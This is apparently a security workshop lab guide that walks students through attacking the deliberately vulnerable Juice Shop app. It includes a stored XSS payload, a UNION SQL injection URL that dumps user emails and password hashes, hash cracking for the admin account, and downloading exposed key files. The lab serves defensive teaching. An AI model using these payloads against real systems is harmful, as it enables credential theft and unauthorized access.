Lab 2 – Hacking the Juice Shop
------------------------------

Objective
~~~~~~~~~

- Demonstrate the vulnerabilities in the Juice Shop web application.

- Demonstrate a cross site scripting (XSS) vulnerability.

- Demonstrate a SQL injection vulnerability.

- Demonstrate a privilege escalation vulnerability.

- Demonstrate an unauthorized file access.

Task – Demonstrate a server side cross site scripting (XSS) vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Visit the About page so you can see that it hasn't been hacked yet by clicking on the hamburger menu in the top left corner of the page:

.. image:: ../images/hamburger_menu.png

and then click on **About Us**.

.. image:: ../images/aboutus_menu.png

You should see a bunch of lorem ipsum text and a slider of customer feedback entries retrieved from the database.

We will insert our cross site scripting hack into the database via the Customer Feedback form. Click on the hamburger menu again and then click on **Customer Feedback**.

In the comment area paste the following:

.. code-block:: none

    <<script>FUD</script>iframe allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1030254214&auto_play=true>

Then, choose any amount of stars for the rating and answer the math challenge and then click Submit.

Now head back over to the About page by clicking on the hamburger menu and then clicking on About. You should hear a jingle about the Juice Shop.

Task – Demonstrate a SQL injection vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Paste the following path in your browser's location bar after the FQDN of the Juice Shop:


.. code-block:: none
   
    /rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

The location bar should look something like (don't copy this since your FQDN will be different):

.. code-block:: none

    https://ba3eff45-2f23-49ab-8122-2e3bdc1ed9ad.access.udf.f5.com/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

The result should be a list of all the users in the database including their hashed passwords.

Task - Demonstrate a privilege escalation vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use a rainbow lookup table to expose the admin user's password by navigating to https://crackstation.net/ and entering the hash


.. image:: ../images/juice_shop_crackstation.png


Task - Demonstrate an unauthorized file access vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Navigate to /encryptionkeys to expose an unwanted directory listing

.. image:: ../images/juice_shop_encryptionkeys.png

Click on the file ``premium.key`` and attempt to download it.

The files in this directory can be downloaded. A good WAF policy should block access to sensitive file types.
